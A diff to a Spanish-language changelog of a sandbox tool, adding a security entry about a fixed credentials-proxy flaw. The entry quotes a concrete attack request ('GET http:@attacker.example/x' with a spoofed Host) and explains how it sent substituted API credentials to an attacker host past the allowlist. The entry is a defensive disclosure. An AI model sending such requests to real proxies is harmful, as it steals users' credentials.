@@ -68,6 +68,17 @@ y [`ext/sandbox/CHANGELOG.md`](ext/sandbox/CHANGELOG.md).
   shell); `/data` en RAM ya monta (el loop con autoborrado se soltaba antes del
   `mount`).
 
+### Seguridad
+
+- **Proxy de credenciales: la clave ya no sale hacia otro host.** Un request-target
+  opaco (`GET http:@attacker.example/x` con `Host: api.stripe.com`) elegía la
+  credencial por el `Host`, pero la URL saliente se montaba pegando el request-target
+  tras `https://`+host: salía hacia `https://api.stripe.com@attacker.example/x`, con TLS
+  verificado contra el atacante, las cabeceras ya sustituidas y sin pasar por la
+  allowlist. Ahora la salida se monta por campos (`https`, el Host, la ruta y la query)
+  y un request-target opaco, con usuario, con otro esquema, hacia otro host o que no
+  empiece por `/` es un 400 sin leer el cuerpo ni abrir la salida.
+
 ## v0.17.0 — 2026-09-29
 
 La versión más grande hasta ahora: `kling db` (bases de datos desechables por microVM:
